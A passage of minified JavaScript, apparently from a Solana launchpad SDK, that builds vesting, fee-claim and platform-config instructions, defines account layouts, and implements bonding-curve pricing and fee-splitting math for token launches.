        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: s, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: a, isSigner: !1, isWritable: !1 },
        { pubkey: u, isSigner: !1, isWritable: !1 },
        { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
        { pubkey: Ec, isSigner: !1, isWritable: !1 },
      ],
      d = dt.alloc(c.span);
    return (
      c.encode({}, d),
      new vs({
        keys: l,
        programId: t,
        data: dt.from([...iP.claimVestedToken, ...d]),
      })
    );
  }
  function lP(t, e, n, r, o, i) {
    let s = JT([zT("shareAmount")]),
      a = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !0 },
        { pubkey: r, isSigner: !1, isWritable: !0 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
      ],
      u = dt.alloc(s.span);
    return (
      s.encode({ shareAmount: i }, u),
      new vs({
        keys: a,
        programId: t,
        data: dt.from([...iP.createVestingAccount, ...u]),
      })
    );
  }
  function dP(t, e, n, r, o, i, s, a, u) {
    let c = [
      { pubkey: e, isSigner: !0, isWritable: !0 },
      { pubkey: n, isSigner: !1, isWritable: !1 },
      { pubkey: r, isSigner: !1, isWritable: !0 },
      { pubkey: o, isSigner: !1, isWritable: !0 },
      { pubkey: i, isSigner: !1, isWritable: !0 },
      { pubkey: s, isSigner: !1, isWritable: !0 },
      { pubkey: a, isSigner: !1, isWritable: !0 },
      { pubkey: u, isSigner: !1, isWritable: !0 },
      { pubkey: Gs.programId, isSigner: !1, isWritable: !0 },
      { pubkey: Ec, isSigner: !1, isWritable: !0 },
    ];
    return new vs({ keys: c, programId: t, data: iP.claimPlatformFee });
  }
  function fP(t, e, n, r, o, i, s, a, u, c, l) {
    let d = JT([
        zT("platformScale"),
        zT("creatorScale"),
        zT("burnScale"),
        zT("feeRate"),
        ZT("name"),
        ZT("web"),
        ZT("img"),
      ]),
      f = [
        { pubkey: e, isSigner: !0, isWritable: !0 },
        { pubkey: n, isSigner: !1, isWritable: !1 },
        { pubkey: r, isSigner: !1, isWritable: !1 },
        { pubkey: o, isSigner: !1, isWritable: !0 },
        { pubkey: i, isSigner: !1, isWritable: !0 },
        { pubkey: Gs.programId, isSigner: !1, isWritable: !1 },
      ],
      h = dt.alloc(
        32 +
          dt.from(u, "utf-8").length +
          dt.from(c, "utf-8").length +
          dt.from(l, "utf-8").length +
          12
      );
    return (
      d.encode(
        {
          platformScale: s.platformScale,
          creatorScale: s.creatorScale,
          burnScale: s.burnScale,
          feeRate: a,
          name: u,
          web: c,
          img: l,
        },
        h
      ),
      new vs({
        keys: f,
        programId: t,
        data: dt.from([...iP.createPlatformConfig, ...h]),
      })
    );
  }
  function hP(t, e, n, r) {
    let o,
      i = [
        { pubkey: e, isSigner: !0, isWritable: !1 },
        { pubkey: n, isSigner: !1, isWritable: !0 },
      ];
    if ("updateClaimFeeWallet" === r.type) {
      let t = JT([UT("index"), jT("value")]);
      (o = dt.alloc(t.span)), t.encode({ index: 0, value: r.value }, o);
    } else if ("updateLockNftWallet" === r.type) {
      let t = JT([UT("index"), jT("value")]);
      (o = dt.alloc(t.span)), t.encode({ index: 1, value: r.value }, o);
    } else if ("migrateCpLockNftScale" === r.type) {
      let t = JT([
        UT("index"),
        zT("platformScale"),
        zT("creatorScale"),
        zT("burnScale"),
      ]);
      (o = dt.alloc(t.span)), t.encode(SA({ index: 2 }, r.value), o);
    } else if ("updateFeeRate" === r.type) {
      let t = JT([UT("index"), zT("value")]);
      (o = dt.alloc(t.span)), t.encode({ index: 3, value: r.value }, o);
    } else if (
      "updateImg" === r.type ||
      "updateName" === r.type ||
      "updateWeb" === r.type
    ) {
      let t = JT([UT("index"), ZT("value")]);
      (o = dt.alloc(dt.from(r.value, "utf-8").length + 4 + 1)),
        "updateName" === r.type
          ? t.encode({ index: 4, value: r.value }, o)
          : "updateWeb" === r.type
          ? t.encode({ index: 5, value: r.value }, o)
          : "updateImg" === r.type && t.encode({ index: 6, value: r.value }, o);
    } else if ("updateCpConfigId" === r.type) {
      i.push({ pubkey: r.value, isSigner: !1, isWritable: !1 });
      let t = JT([UT("index")]);
      (o = dt.alloc(t.span)), t.encode({ index: 7 }, o);
    } else {
      if ("updateAll" !== r.type) throw Error("updateInfo params type error");
      {
        void 0,
          i.push({ pubkey: r.value.cpConfigId, isSigner: !1, isWritable: !1 });
        let t = JT([
          UT("index"),
          jT("platformClaimFeeWallet"),
          jT("platformLockNftWallet"),
          zT("platformScale"),
          zT("creatorScale"),
          zT("burnScale"),
          zT("feeRate"),
          ZT("name"),
          ZT("web"),
          ZT("img"),
        ]);
        (o = dt.alloc(
          109 +
            dt.from(r.value.name, "utf-8").length +
            dt.from(r.value.web, "utf-8").length +
            dt.from(r.value.img, "utf-8").length
        )),
          t.encode(
            {
              index: 8,
              platformClaimFeeWallet: r.value.platformClaimFeeWallet,
              platformLockNftWallet: r.value.platformLockNftWallet,
              platformScale: r.value.migrateCpLockNftScale.platformScale,
              creatorScale: r.value.migrateCpLockNftScale.creatorScale,
              burnScale: r.value.migrateCpLockNftScale.burnScale,
              feeRate: r.value.feeRate,
              name: r.value.name,
              web: r.value.web,
              img: r.value.img,
            },
            o
          );
      }
    }
    return new vs({
      keys: i,
      programId: t,
      data: dt.from([...iP.updatePlaformConfig, ...o]),
    });
  }
  var pP = JT([
      zT(),
      zT("epoch"),
      UT("curveType"),
      CT("index"),
      zT("migrateFee"),
      zT("tradeFeeRate"),
      zT("maxShareFeeRate"),
      zT("minSupplyA"),
      zT("maxLockRate"),
      zT("minSellRateA"),
      zT("minMigrateRateA"),
      zT("minFundRaisingB"),
      jT("mintB"),
      jT("protocolFeeOwner"),
      jT("migrateFeeOwner"),
      jT("migrateToAmmWallet"),
      jT("migrateToCpmmWallet"),
      YT(zT(), 16),
    ]),
    mP = JT([
      zT("totalLockedAmount"),
      zT("cliffPeriod"),
      zT("unlockPeriod"),
      zT("startTime"),
      zT("totalAllocatedShare"),
    ]),
    gP = JT([
      zT(),
      zT("epoch"),
      UT("bump"),
      UT("status"),
      UT("mintDecimalsA"),
      UT("mintDecimalsB"),
      UT("migrateType"),
      zT("supply"),
      zT("totalSellA"),
      zT("virtualA"),
      zT("virtualB"),
      zT("realA"),
      zT("realB"),
      zT("totalFundRaisingB"),
      zT("protocolFee"),
      zT("platformFee"),
      zT("migrateFee"),
      mP.replicate("vestingSchedule"),
      jT("configId"),
      jT("platformId"),
      jT("mintA"),
      jT("mintB"),
      jT("vaultA"),
      jT("vaultB"),
      jT("creator"),
      YT(zT(), 8),
    ]);
  JT([
    zT(),
    zT("epoch"),
    jT("poolId"),
    jT("beneficiary"),
    zT("claimedAmount"),
    zT("tokenShareAmount"),
    YT(zT(), 8),
  ]);
  var yP = JT([
      zT(),
      zT("epoch"),
      jT("platformClaimFeeWallet"),
      jT("platformLockNftWallet"),
      zT("platformScale"),
      zT("creatorScale"),
      zT("burnScale"),
      zT("feeRate"),
      YT(UT(), 64, "name"),
      YT(UT(), 256, "web"),
      YT(UT(), 256, "img"),
      jT("cpConfigId"),
      YT(UT(), 224),
    ]),
    wP = class {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        throw Error();
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        throw Error();
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        throw Error();
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        throw Error();
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        throw Error();
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        throw Error();
      }
    },
    bP = class extends wP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new bI(e.toString()).div(t.toString()).mul(10 ** (n - r));
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(t.virtualB.add(t.realB).toString())
          .div(t.virtualA.sub(t.realA).toString())
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new bI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new bI(t.virtualB.add(t.realB.add(o)).toString())
          .div(t.virtualA.sub(t.realA.add(r)).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        if (t.lte(n)) throw Error("supply need gt total sell");
        let i = t.sub(n).sub(r);
        if (i.lte(new Yn(0))) throw Error("supplyMinusSellLocked <= 0");
        let s = e.sub(o);
        if (s.lte(new Yn(0))) throw Error("tfMinusMf <= 0");
        let a = s.mul(n).mul(n).div(i),
          u = s.mul(n).div(i).sub(e);
        if (u.lt(new Yn(0)))
          throw Error("supply/totalSell/totalLockedAmount diff too high");
        let c = a.div(u),
          l = e.mul(e).div(u);
        if (c.lt(new Yn(0)) || l.lt(new Yn(0))) throw Error("invalid input 0");
        return { a: c, b: l, c: n };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          inputReserve: t.virtualB.add(t.realB),
          outputReserve: t.virtualA.sub(t.realA),
        });
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          inputReserve: t.virtualB.add(t.realB),
          outputReserve: t.virtualA.sub(t.realA),
        });
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          inputReserve: t.virtualA.sub(t.realA),
          outputReserve: t.virtualB.add(t.realB),
        });
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          inputReserve: t.virtualA.sub(t.realA),
          outputReserve: t.virtualB.add(t.realB),
        });
      }
      static getAmountOut({ amountIn: t, inputReserve: e, outputReserve: n }) {
        let r = t.mul(n),
          o = e.add(t);
        return r.div(o);
      }
      static getAmountIn({ amountOut: t, inputReserve: e, outputReserve: n }) {
        return j_(e.mul(t), n.sub(t));
      }
    },
    vP = class extends wP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new bI(e.toString()).div(t.toString()).mul(10 ** (n - r));
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(t.virtualB.toString())
          .div(t.virtualA.toString())
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new bI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new bI(t.virtualB.add(t.realB).add(o).toString())
          .div(t.virtualA.sub(t.realA).add(r).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        let i = t.sub(r);
        if (i.lte(new Yn(0))) throw Error("invalid input 1");
        let s = new Yn(2).mul(e).sub(o),
          a = e.mul(i).div(s);
        return { a: a, b: e, c: a };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          initInput: t.virtualB,
          initOutput: t.virtualA,
        });
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          initInput: t.virtualB,
          initOutput: t.virtualA,
        });
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        return this.getAmountOut({
          amountIn: e,
          initInput: t.virtualA,
          initOutput: t.virtualB,
        });
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        return this.getAmountIn({
          amountOut: e,
          initInput: t.virtualA,
          initOutput: t.virtualB,
        });
      }
      static getAmountOut({ amountIn: t, initInput: e, initOutput: n }) {
        return n.mul(t).div(e);
      }
      static getAmountIn({ amountOut: t, initInput: e, initOutput: n }) {
        return j_(e.mul(t), n);
      }
    },
    AP = class {
      static _multipler(t) {
        return new bI(10).pow(t);
      }
      static getPrice({ priceX64: t, decimalA: e, decimalB: n }) {
        return new bI(t.toString())
          .div(this._Q64)
          .mul(this._multipler(e))
          .div(this._multipler(n));
      }
      static getPriceX64({ price: t, decimalA: e, decimalB: n }) {
        let r = t.mul(this._multipler(n)).div(this._multipler(e));
        return new Yn(r.mul(this._Q64).toFixed(0));
      }
    };
  AP._Q64 = new bI(new Yn(1).shln(64).toString());
  var kP = class extends wP {
      static getPoolInitPriceByPool({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(0);
      }
      static getPoolInitPriceByInit({ a: t, b: e, decimalA: n, decimalB: r }) {
        return new bI(0);
      }
      static getPoolPrice({ poolInfo: t, decimalA: e, decimalB: n }) {
        return new bI(t.virtualA.mul(t.realA).toString())
          .div(AP._Q64)
          .mul(10 ** (e - n));
      }
      static getPoolEndPrice({
        supply: t,
        totalSell: e,
        totalLockedAmount: n,
        totalFundRaising: r,
        migrateFee: o,
        decimalA: i,
        decimalB: s,
      }) {
        return new bI(r.sub(o).toString())
          .div(t.sub(e).sub(n).toString())
          .mul(10 ** (i - s));
      }
      static getPoolEndPriceReal({ poolInfo: t, decimalA: e, decimalB: n }) {
        let r = t.totalSellA.sub(t.realA),
          o = t.totalFundRaisingB.sub(t.realB);
        return new bI(t.virtualB.add(t.realB).add(o).toString())
          .div(t.virtualA.sub(t.realA).add(r).toString())
          .mul(10 ** (e - n));
      }
      static getInitParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        migrateFee: o,
      }) {
        let i = t.sub(r);
        if (i.lte(new Yn(0))) throw Error("supplyMinusLocked need gt 0");
        let s = e.mul(new Yn(3)).sub(o),
          a = e.mul(new Yn(2)).mul(i).div(s),
          u = a.mul(a),
          c = e.mul(new Yn(2)).mul(ZB).div(u);
        if (!c.gt(new Yn(0))) throw Error("a need gt 0");
        if (!JB.gt(c)) throw Error("a need lt u64 max");
        return { a: c, b: new Yn(0), c: a };
      }
      static buyExactIn({ poolInfo: t, amount: e }) {
        let n = t.realB.add(e),
          r = new Yn(2).mul(n).mul(ZB).div(t.virtualA);
        return new Yn(new bI(r.toString()).sqrt().toFixed(0)).sub(t.realA);
      }
      static buyExactOut({ poolInfo: t, amount: e }) {
        let n = t.realA.add(e),
          r = n.mul(n),
          { div: o, mod: i } = t.virtualA.mul(r).divmod(new Yn(2).mul(ZB));
        return (i.isZero() ? o : o.add(new Yn(1))).sub(t.realB);
      }
      static sellExactIn({ poolInfo: t, amount: e }) {
        let n = t.realA.sub(e),
          r = n.mul(n),
          { div: o, mod: i } = t.virtualA.mul(r).divmod(new Yn(2).mul(ZB)),
          s = i.isZero() ? o : o.add(new Yn(1));
        return t.realB.sub(s);
      }
      static sellExactOut({ poolInfo: t, amount: e }) {
        let n = t.realB.sub(e),
          r = new Yn(2).mul(n).mul(ZB).div(t.virtualA),
          o = new Yn(new bI(r.toString()).sqrt().toFixed(0));
        return t.realA.sub(o);
      }
    },
    IP = class {
      static getPoolCurvePointByPoolInfo({
        curveType: t,
        pointCount: e,
        poolInfo: n,
      }) {
        return this.getPoolCurvePointByInit({
          curveType: t,
          pointCount: e,
          supply: n.supply,
          totalFundRaising: n.totalFundRaisingB,
          totalSell: n.totalSellA,
          totalLockedAmount: n.vestingSchedule.totalLockedAmount,
          migrateFee: n.migrateFee,
          decimalA: n.mintDecimalsA,
          decimalB: n.mintDecimalsB,
        });
      }
      static getPoolCurvePointByInit({
        curveType: t,
        pointCount: e,
        supply: n,
        totalFundRaising: r,
        totalSell: o,
        totalLockedAmount: i,
        migrateFee: s,
        decimalA: a,
        decimalB: u,
      }) {
        if (e < 3) throw Error("point count < 3");
        let c = this.getCurve(t),
          l = c.getInitParam({
            supply: n,
            totalFundRaising: r,
            totalSell: o,
            totalLockedAmount: i,
            migrateFee: s,
          }),
          d = c.getPoolInitPriceByInit(
            _A(SA({}, l), { decimalA: a, decimalB: u })
          ),
          f = r.div(new Yn(e - 1)),
          h = new Yn(0),
          p = [{ price: d, totalSellSupply: 0 }],
          { a: m, b: g } = l,
          y = h,
          w = h;
        for (let b = 1; b < e; b++) {
          let n = b !== e - 1 ? f : r.sub(w),
            i = this.buyExactIn({
              poolInfo: {
                virtualA: m,
                virtualB: g,
                realA: y,
                realB: w,
                totalFundRaisingB: r,
                totalSellA: o,
              },
              amountB: n,
              protocolFeeRate: h,
              platformFeeRate: h,
              curveType: t,
              shareFeeRate: h,
            });
          (y = y.add(i.amountA)), (w = w.add(i.amountB));
          let s = this.getPrice({
            poolInfo: { virtualA: m, virtualB: g, realA: y, realB: w },
            decimalA: a,
            decimalB: u,
            curveType: t,
          });
          p.push({
            price: s,
            totalSellSupply: new bI(y.toString()).div(10 ** a).toNumber(),
          });
        }
        return p;
      }
      static getPoolInitPriceByPool({
        poolInfo: t,
        decimalA: e,
        decimalB: n,
        curveType: r,
      }) {
        return this.getCurve(r).getPoolInitPriceByPool({
          poolInfo: t,
          decimalA: e,
          decimalB: n,
        });
      }
      static getPoolInitPriceByInit({
        a: t,
        b: e,
        decimalA: n,
        decimalB: r,
        curveType: o,
      }) {
        return this.getCurve(o).getPoolInitPriceByInit({
          a: t,
          b: e,
          decimalA: n,
          decimalB: r,
        });
      }
      static getPrice({ poolInfo: t, curveType: e, decimalA: n, decimalB: r }) {
        return this.getCurve(e).getPoolPrice({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static getEndPrice({
        poolInfo: t,
        curveType: e,
        decimalA: n,
        decimalB: r,
      }) {
        return this.getCurve(e).getPoolPrice({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static getPoolEndPriceReal({
        poolInfo: t,
        curveType: e,
        decimalA: n,
        decimalB: r,
      }) {
        return this.getCurve(e).getPoolEndPriceReal({
          poolInfo: t,
          decimalA: n,
          decimalB: r,
        });
      }
      static checkParam({
        supply: t,
        totalFundRaising: e,
        totalSell: n,
        totalLockedAmount: r,
        decimals: o,
        config: i,
        migrateType: s,
      }) {
        if (6 !== Number(o)) throw Error("decimals = 6");
        if (t.mul(i.maxLockRate).div(J_).lt(r))
          throw Error("total lock amount gte max lock amount");
        if (t.lt(i.minSupplyA.mul(new Yn(10 ** o))))
          throw Error("supply lt min supply");
        let a = t.mul(i.minSellRateA).div(J_);
        if (n.lt(a)) throw Error("invalid input");
        if (e.lt(i.minFundRaisingB))
          throw Error("total fund raising lt min fund raising");
        let u = t.sub(n).sub(r),
          c = t.mul(i.minMigrateRateA).div(J_);
        if (u.lt(c)) throw Error("migrate lt min migrate amount");
        let l = t.sub(n).sub(r),
          d = new Yn(new bI(l.mul(e).toString()).sqrt().toFixed(0));
        if ("amm" === s) {
          let t = new Yn(10).pow(new Yn(o));
          if (d.lte(t)) throw Error("check migrate lp error");
        } else {
          if ("cpmm" !== s) throw Error("migrate type error");
          {
            let t = new Yn(100);
            if (d.lte(t)) throw Error("check migrate lp error");
          }
        }
      }
      static buyExactIn({
        poolInfo: t,
        amountB: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s,
          a,
          u,
          c = n.add(i).add(r),
          l = this.calculateFee({ amount: e, feeRate: c }),
          d = e.sub(l),
          f = this.getCurve(o),
          h = f.buyExactIn({ poolInfo: t, amount: d }),
          p = t.totalSellA.sub(t.realA);
        if (h.gt(p)) {
          s = p;
          let e = f.buyExactOut({ poolInfo: t, amount: s });
          (a = this.calculatePreFee({ postFeeAmount: e, feeRate: c })),
            (u = a.sub(e));
        } else (s = h), (a = e), (u = l);
        return {
          amountA: s,
          amountB: a,
          splitFee: this.splitFee({
            totalFee: u,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static buyExactOut({
        poolInfo: t,
        amountA: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = t.totalSellA.sub(t.realA),
          a = e;
        e.gt(s) && (a = s);
        let u = this.getCurve(o).buyExactOut({ poolInfo: t, amount: e }),
          c = n.add(i).add(r),
          l = this.calculatePreFee({ postFeeAmount: u, feeRate: c }),
          d = l.sub(u);
        return {
          amountA: a,
          amountB: l,
          splitFee: this.splitFee({
            totalFee: d,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static sellExactIn({
        poolInfo: t,
        amountA: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = this.getCurve(o).sellExactIn({ poolInfo: t, amount: e }),
          a = this.calculateFee({ amount: s, feeRate: n.add(i).add(r) }),
          u = this.splitFee({
            totalFee: a,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          });
        return { amountA: e, amountB: s.sub(a), splitFee: u };
      }
      static sellExactOut({
        poolInfo: t,
        amountB: e,
        protocolFeeRate: n,
        platformFeeRate: r,
        curveType: o,
        shareFeeRate: i,
      }) {
        let s = n.add(i).add(r),
          a = this.calculatePreFee({ postFeeAmount: e, feeRate: s });
        if (t.realB.lt(a)) throw Error("Insufficient liquidity");
        let u = a.sub(e),
          c = IP.getCurve(o).sellExactOut({ poolInfo: t, amount: a });
        if (c.gt(t.realA)) throw Error();
        return {
          amountA: c,
          amountB: e,
          splitFee: this.splitFee({
            totalFee: u,
            protocolFeeRate: n,
            platformFeeRate: r,
            shareFeeRate: i,
          }),
        };
      }
      static splitFee({
        totalFee: t,
        protocolFeeRate: e,
        platformFeeRate: n,
        shareFeeRate: r,
      }) {
        let o = e.add(n).add(r),
          i = o.isZero() ? new Yn(0) : t.mul(n).div(o),
          s = o.isZero() ? new Yn(0) : t.mul(r).div(o);
        return { platformFee: i, shareFee: s, protocolFee: t.sub(i).sub(s) };
      }
      static calculateFee({ amount: t, feeRate: e }) {
        return aS(t, e, J_);
      }
      static calculatePreFee({ postFeeAmount: t, feeRate: e }) {
        if (e.isZero()) return t;
        let n = t.mul(J_),
          r = J_.sub(e);
        return n.add(r).sub(new Yn(1)).div(r);
      }
      static getCurve(t) {
        switch (t) {
          case 0:
            return bP;
          case 1:
            return vP;
          case 2:
            return kP;
        }
        throw Error("find curve error");
      }
    },
    SP = {
      initPriceX64: new Yn("515752397214619"),
      supply: new Yn(1e15),
      totalSellA: new Yn(7931e11),
      totalFundRaisingB: new Yn(85e9),
      totalLockedAmount: new Yn("0"),
      cliffPeriod: new Yn("0"),
      unlockPeriod: new Yn("0"),
      virtualA: new Yn("1073471847374405"),
      virtualB: new Yn("30050573465"),
      realA: new Yn(0),
      realB: new Yn(0),
      protocolFee: new Yn(0),
      platformId: new Ji("4Bu96XjU84XjPDSpveTVf6LYGCkfW5FK7SNkREWcEfV4"),
      vestingSchedule: {
        totalLockedAmount: new Yn(0),
        cliffPeriod: new Yn(0),
        unlockPeriod: new Yn(0),
        startTime: new Yn(0),
        totalAllocatedShare: new Yn(0),
      },
    },
    _P = new Yn(1e4),
    TP = class extends cT {
      constructor(t) {
        super(t);
      }
      async createLaunchpad(t) {
        var e,
          n,
          r,
          o,
          i,
          s,
          a = t,
          {
            programId: u = U_,
            authProgramId: c,
            platformId: l = SP.platformId,
            mintA: d,
            decimals: f = 6,
            mintBDecimals: h = 9,
            name: p,
            symbol: m,
            uri: g,
            migrateType: y,
            configId: w,
            configInfo: b,
            platformFeeRate: v,
            txVersion: A,
            computeBudgetConfig: k,
            txTipConfig: I,
            feePayer: S,
            buyAmount: _,
            minMintAAmount: T,
            slippage: B,
            associatedOnly: C = !0,
            checkCreateATAOwner: E = !1,
            extraSigners: x,
          } = a,
          P = TA(a, [
            "programId",
            "authProgramId",
            "platformId",
            "mintA",
            "decimals",
            "mintBDecimals",
            "name",
            "symbol",
            "uri",
            "migrateType",
            "configId",
            "configInfo",
            "platformFeeRate",
            "txVersion",
            "computeBudgetConfig",
            "txTipConfig",
            "feePayer",
            "buyAmount",
            "minMintAAmount",
            "slippage",
            "associatedOnly",
            "checkCreateATAOwner",
            "extraSigners",
          ]);
        let O = this.createTxBuilder(S);
        c = null != c ? c : Qx(u).publicKey;
        let R = b;
        if (!R && w) {
          let t = await this.scope.connection.getAccountInfo(w);
          t && (R = pP.decode(t.data));
        }
        R || this.logAndCreateError("config not found");
        let M = R.mintB,
          L = R.curveType,
          { publicKey: N } = $x(u, d, M),
          { publicKey: D } = tP(u, N, d),
          { publicKey: U } = tP(u, N, M),
          { publicKey: q } = SC(d);
        void 0,
          m.length > 10 &&
            this.logAndCreateError("Symbol length should shorter than 11"),
          g || this.logAndCreateError("uri should not empty"),
          _.lte(new Yn(0)) &&
            this.logAndCreateError("buy amount should gt 0:", _.toString());
        let z = null != (e = null == P ? void 0 : P.supply) ? e : SP.supply,
          K =
            null != (n = null == P ? void 0 : P.totalSellA) ? n : SP.totalSellA,
          W =
            null != (r = null == P ? void 0 : P.totalFundRaisingB)
              ? r
              : SP.totalFundRaisingB,
          F =
            null != (o = null == P ? void 0 : P.totalLockedAmount)
              ? o
              : new Yn(0),
          j = v;
        if (!v) {
          let t = await this.scope.connection.getAccountInfo(l);
          t || this.logAndCreateError("platform id not found:", l.toString()),
            (j = yP.decode(t.data).feeRate);
        }
        let G = IP.getCurve(R.curveType).getInitParam({
            supply: z,
            totalFundRaising: W,
            totalSell: K,
            totalLockedAmount: F,
            migrateFee: R.migrateFee,
          }),
          V = {
            epoch: new Yn(896),
            bump: 254,
            status: 0,
            mintDecimalsA: f,
            mintDecimalsB: h,
            supply: z,
            totalSellA: K,
            mintA: new Ji(d),
            mintB: M,
            virtualA: G.a,
            virtualB: G.b,
            realA: SP.realA,
            realB: SP.realB,
            migrateFee: R.migrateFee,
            migrateType: "amm" === y ? 0 : 1,
            protocolFee: SP.protocolFee,
            platformFee: j,
            platformId: l,
            configId: w,
            vaultA: D,
            vaultB: U,
            creator: this.scope.ownerPubKey,
            totalFundRaisingB: W,
            vestingSchedule: {
              totalLockedAmount: F,
              cliffPeriod: new Yn(0),
              unlockPeriod: new Yn(0),
              startTime: new Yn(0),
              totalAllocatedShare: new Yn(0),
            },
          },
          H = IP.getCurve(R.curveType),
          { c: Z } = H.getInitParam({
            supply: V.supply,
            totalFundRaising: V.totalFundRaisingB,
            totalLockedAmount: F,
            totalSell: 0 === R.curveType ? V.totalSellA : new Yn(0),
            migrateFee: R.migrateFee,
          });
        try {
          IP.checkParam({
            supply: V.supply,
            totalFundRaising: V.totalFundRaisingB,
            totalSell: Z,
            totalLockedAmount: F,
            decimals: V.mintDecimalsA,
            config: R,
            migrateType: y,
          }),
            void 0;
        } catch (Y) {
          this.logAndCreateError(
            `check create mint params failed, ${Y.message}`
          );
        }
        O.addInstruction({
          instructions: [
            sP(
              u,
              null != S ? S : this.scope.ownerPubKey,
              this.scope.ownerPubKey,
              w,
              l,
              c,
              N,
              d,
              M,
              D,
              U,
              q,
              Bc,
              Bc,
              f,
              p,
              m,
              g || "https://",
              {
                type:
                  0 === L
                    ? "ConstantCurve"
                    : 1 === L
                    ? "FixedCurve"
                    : 2 === L
                    ? "LinearCurve"
                    : "ConstantCurve",
                totalSellA: K,
                migrateType: y,
                supply: z,
                totalFundRaisingB: W,
              },
              F,
              null != (i = null == P ? void 0 : P.cliffPeriod) ? i : new Yn(0),
              null != (s = null == P ? void 0 : P.unlockPeriod) ? s : new Yn(0)
            ),
          ],
        });
        let X,
          J = new Yn(0);
        if (
          (null != x && x.length && O.addInstruction({ signers: x }),
          !P.createOnly)
        ) {
          let { builder: t, extInfo: e } = await this.buyToken({
            programId: u,
            authProgramId: c,
            mintA: d,
            mintB: M,
            poolInfo: V,
            buyAmount: _,
            minMintAAmount: T,
            shareFeeRate: P.shareFeeRate,
            shareFeeReceiver: P.shareFeeReceiver,
            configInfo: R,
            platformFeeRate: j,
            slippage: B,
            associatedOnly: C,
            checkCreateATAOwner: E,
          });
          O.addInstruction(SA({}, t.AllTxData)),
            (J = e.outAmount),
            (X =
              ("devnet" !== this.scope.cluster && 1 !== A) ||
              !P.shareFeeReceiver
                ? void 0
                : [t.allInstructions[0]]);
        }
        return (
          O.addTipInstruction(I),
          0 === A
